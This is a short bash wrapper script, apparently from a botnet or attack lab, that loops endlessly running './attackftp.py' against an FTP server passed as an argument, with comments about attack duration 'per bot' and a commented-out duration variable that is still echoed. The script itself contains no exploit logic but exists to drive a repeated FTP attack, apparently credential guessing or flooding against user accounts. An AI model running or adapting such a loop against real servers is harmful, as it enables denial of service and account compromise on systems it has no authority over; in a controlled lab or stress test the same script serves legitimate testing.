#!/bin/bash

#give the duration of the attack per bot
#duration=${1:-"9999999999"}

echo "runnging $duration"

server=$1



while true;do
	./attackftp.py -t $server -p users
	sleep 1
done



